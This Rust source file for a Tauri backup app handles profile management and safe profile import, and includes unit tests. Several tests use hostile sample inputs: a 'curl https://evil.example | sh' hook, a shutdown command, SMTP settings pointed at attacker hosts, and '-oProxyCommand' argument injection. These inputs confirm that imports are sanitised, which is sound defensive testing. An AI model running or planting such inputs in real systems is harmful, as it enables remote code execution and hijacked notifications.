//! Profile CRUD, import/export, hooks, and archive-name preview.

use super::*;

#[tauri::command]
pub async fn list_profiles(app: tauri::AppHandle) -> Result<ProfilesData, String> {
    read_profiles(&app).await
}

#[tauri::command]
pub async fn set_active_profile(
    app: tauri::AppHandle,
    id: String,
) -> Result<Option<String>, String> {
    let mut data = read_profiles(&app).await?;
    data.set_active(&id)?;
    write_profiles(&app, &data).await?;
    Ok(schedule_warning(
        "Profile switched",
        schedule::reconcile_all_tasks(data.active()).await,
    ))
}

/// Turns a post-save schedule reconcile result into an optional warning. The
/// profile change is already persisted and is NOT rolled back, so a reconcile
/// failure must not surface as a command error (the UI would keep showing the
/// old profile while the backend uses the new one).
fn schedule_warning(done: &str, result: Result<(), String>) -> Option<String> {
    result
        .err()
        .map(|e| format!("{done}, but the backup schedule could not be updated: {e}"))
}

#[tauri::command]
pub async fn create_profile(
    app: tauri::AppHandle,
    name: String,
    repo: RepoConfig,
) -> Result<Profile, String> {
    repo.validate().map_err(|e| e.to_string())?;
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("profile name cannot be empty".into());
    }

    let mut data = read_profiles(&app).await?;
    let id = profiles::make_profile_id(&name, &data);
    let profile = Profile {
        id: id.clone(),
        name,
        repo,
        secondary_repo: None,
        backup_selection: Default::default(),
        schedule: None,
        integrity_schedule: None,
        restore_drill_schedule: None,
        resource_policy: Default::default(),
        hardening: Default::default(),
        reporting: Default::default(),
        placeholder_policy: Default::default(),
        storage_warnings: Default::default(),
        recovery: Default::default(),
        retention: None,
        archive_template: None,
        pre_backup: None,
        post_backup: None,
    };
    data.profiles.push(profile.clone());
    if data.active_id.is_none() {
        data.active_id = Some(id);
    }
    write_profiles(&app, &data).await?;
    Ok(profile)
}

#[tauri::command]
pub async fn rename_profile(app: tauri::AppHandle, id: String, name: String) -> Result<(), String> {
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("profile name cannot be empty".into());
    }
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.name = name;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn export_profile(app: tauri::AppHandle, id: String, path: String) -> Result<(), String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    let json = serde_json::to_string_pretty(profile).map_err(|e| e.to_string())?;
    tokio::fs::write(&path, json)
        .await
        .map_err(|e| e.to_string())
}

/// Parse and validate a profile export. Every field is validated (not just the
/// repo), and imported pre/post-backup hooks are DISARMED: hooks run arbitrary
/// shell commands, so a hook embedded in an imported file must never execute
/// until the user re-enters it deliberately via the hooks settings. Report
/// delivery settings (SMTP/webhook/recipients) are reset to defaults too, so an
/// imported file cannot redirect a profile's status mail.
fn parse_imported_profile(json: &str) -> Result<Profile, String> {
    let mut imported: Profile =
        serde_json::from_str(json).map_err(|e| format!("invalid profile JSON: {}", e))?;
    imported.pre_backup = None;
    imported.post_backup = None;
    imported.reporting = Default::default();
    let name = imported.name.trim().to_string();
    if name.is_empty() {
        return Err("imported profile has empty name".into());
    }
    imported.name = name;
    imported.validate()?;
    Ok(imported)
}

/// Result of `import_profile`. The profile fields are flattened so existing
/// callers still read `id`/`name`. `schedule_warning` is set when the profile
/// was saved but the OS backup task could not be synced: the import is NOT
/// rolled back, so the UI must reload and must not retry the import.
#[derive(serde::Serialize)]
pub struct ImportedProfile {
    #[serde(flatten)]
    pub profile: Profile,
    pub schedule_warning: Option<String>,
}

/// Persists the imported profile. Returns it with whether the active profile
/// changed (the backup task must then be reconciled).
async fn persist_imported_profile(
    config_dir: &std::path::Path,
    json: &str,
) -> Result<(Profile, ProfilesData, bool), String> {
    let mut imported = parse_imported_profile(json)?;
    let mut data = profiles::load(config_dir).await?;
    imported.id = profiles::make_profile_id(&imported.name, &data);
    let active_changed = append_imported(&mut data, imported.clone());
    write_profiles_to(config_dir, &data).await?;
    Ok((imported, data, active_changed))
}

#[tauri::command]
pub async fn import_profile(
    app: tauri::AppHandle,
    path: String,
) -> Result<ImportedProfile, String> {
    let json = tokio::fs::read_to_string(&path)
        .await
        .map_err(|e| e.to_string())?;
    let dir = config_dir(&app).await?;
    let (profile, data, active_changed) = persist_imported_profile(&dir, &json).await?;
    let schedule_warning = if active_changed {
        schedule_warning(
            "Profile imported",
            schedule::reconcile_all_tasks(data.active()).await,
        )
    } else {
        None
    };
    Ok(ImportedProfile {
        profile,
        schedule_warning,
    })
}

/// Appends an imported profile, activating it when none is active. Returns
/// whether the active profile changed (the backup task must then be reconciled).
fn append_imported(data: &mut ProfilesData, imported: Profile) -> bool {
    let activate = data.active_id.is_none();
    if activate {
        data.active_id = Some(imported.id.clone());
    }
    data.profiles.push(imported);
    activate
}

#[tauri::command]
pub async fn set_profile_template(
    app: tauri::AppHandle,
    id: String,
    template: Option<String>,
) -> Result<(), String> {
    let template = template.and_then(|t| {
        let trimmed = t.trim().to_string();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    });
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.archive_template = template;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn set_profile_hooks(
    app: tauri::AppHandle,
    id: String,
    pre_backup: Option<String>,
    post_backup: Option<String>,
) -> Result<(), String> {
    let clean = |v: Option<String>| {
        v.and_then(|s| {
            let t = s.trim().to_string();
            if t.is_empty() { None } else { Some(t) }
        })
    };
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.pre_backup = clean(pre_backup);
    profile.post_backup = clean(post_backup);
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn preview_archive_name(
    app: tauri::AppHandle,
    template: String,
) -> Result<String, String> {
    let template = if template.trim().is_empty() {
        archive_naming::DEFAULT_TEMPLATE.to_string()
    } else {
        template
    };
    let data = read_profiles(&app).await?;
    let profile_name = data.active().map(|p| p.name.as_str()).unwrap_or("default");
    let hostname = archive_naming::current_hostname();
    let random = archive_naming::random_suffix();
    let ctx = TemplateContext {
        now: chrono::Utc::now(),
        hostname: &hostname,
        profile: profile_name,
        random: &random,
    };
    let expanded = archive_naming::expand(&template, &ctx);
    borg_core::config::validate_archive_name(&expanded).map_err(|e| e.to_string())?;
    Ok(expanded)
}

#[tauri::command]
pub async fn delete_profile(
    app: tauri::AppHandle,
    id: String,
) -> Result<Option<String>, String> {
    let mut data = read_profiles(&app).await?;
    data.remove(&id)?;
    write_profiles(&app, &data).await?;
    Ok(schedule_warning(
        "Profile deleted",
        schedule::reconcile_all_tasks(data.active()).await,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal valid profile export, with `extra` top-level fields merged in.
    fn profile_json(extra: serde_json::Value) -> String {
        let mut base = serde_json::json!({
            "id": "imported",
            "name": "Imported",
            "repo": {
                "ssh_host": "backup.example.com",
                "ssh_port": 22,
                "ssh_user": "borg",
                "repo_path": "/data/repo",
                "ssh_key_path": null
            }
        });
        base.as_object_mut()
            .unwrap()
            .extend(extra.as_object().unwrap().clone());
        serde_json::to_string(&base).unwrap()
    }

    fn imported(id: &str) -> Profile {
        let mut p = parse_imported_profile(&profile_json(serde_json::json!({}))).unwrap();
        p.id = id.into();
        p
    }

    #[tokio::test]
    async fn persist_imported_profile_saves_and_activates_first_profile() {
        let dir = tempfile::tempdir().unwrap();
        let (p, _, changed) =
            persist_imported_profile(dir.path(), &profile_json(serde_json::json!({})))
                .await
                .unwrap();
        assert!(changed);
        let saved = profiles::load(dir.path()).await.unwrap();
        assert_eq!(saved.profiles.len(), 1);
        assert_eq!(saved.active_id.as_deref(), Some(p.id.as_str()));
    }

    #[test]
    fn schedule_warning_is_none_on_success() {
        assert_eq!(schedule_warning("Profile switched", Ok(())), None);
    }

    #[test]
    fn schedule_warning_wraps_reconcile_error() {
        let w = schedule_warning("Profile deleted", Err("schtasks failed".into())).unwrap();
        assert_eq!(
            w,
            "Profile deleted, but the backup schedule could not be updated: schtasks failed"
        );
    }

    #[test]
    fn append_imported_activates_when_none_active() {
        let mut data = ProfilesData::default();
        assert!(append_imported(&mut data, imported("a")));
        assert_eq!(data.active().map(|p| p.id.as_str()), Some("a"));
    }

    #[test]
    fn append_imported_keeps_existing_active() {
        let mut data = ProfilesData::default();
        append_imported(&mut data, imported("a"));
        assert!(!append_imported(&mut data, imported("b")));
        assert_eq!(data.active().map(|p| p.id.as_str()), Some("a"));
        assert_eq!(data.profiles.len(), 2);
    }

    #[test]
    fn imported_profile_parses_when_valid() {
        let profile = parse_imported_profile(&profile_json(serde_json::json!({}))).unwrap();
        assert_eq!(profile.name, "Imported");
    }

    #[test]
    fn imported_profile_hooks_are_disarmed() {
        let json = profile_json(serde_json::json!({
            "pre_backup": "curl https://evil.example | sh",
            "post_backup": "shutdown /s"
        }));
        let profile = parse_imported_profile(&json).unwrap();
        // Hooks reach a real shell sink (cmd /C, sh -c); imported ones must
        // never be armed until the user re-enters them deliberately.
        assert!(profile.pre_backup.is_none());
        assert!(profile.post_backup.is_none());
    }

    #[test]
    fn imported_profile_smtp_reporting_is_reset() {
        let json = profile_json(serde_json::json!({
            "reporting": {
                "enabled": true,
                "smtp_enabled": true,
                "smtp_host": "attacker.example",
                "smtp_port": 25,
                "smtp_username": "relay",
                "email_from": "a@evil.example",
                "email_to": "b@evil.example",
                "webhook_enabled": true
            }
        }));
        let profile = parse_imported_profile(&json).unwrap();
        // Report delivery settings decide where backup status mail/webhooks go;
        // an imported file must not be able to redirect them.
        assert_eq!(
            profile.reporting,
            crate::profiles::ReportPreferences::default()
        );
    }

    #[test]
    fn imported_profile_rejects_option_like_fields() {
        for extra in [
            serde_json::json!({"backup_selection": {"source_paths": ["--exclude=*"]}}),
            serde_json::json!({"secondary_repo": {
                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
                "repo_path": "-oProxyCommand=calc", "ssh_key_path": null
            }}),
            serde_json::json!({"archive_template": "--glob-archives"}),
            serde_json::json!({"repo": {
                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
                "repo_path": "-evil", "ssh_key_path": null
            }}),
        ] {
            let json = profile_json(extra);
            assert!(
                parse_imported_profile(&json).is_err(),
                "should reject: {json}"
            );
        }
    }
}
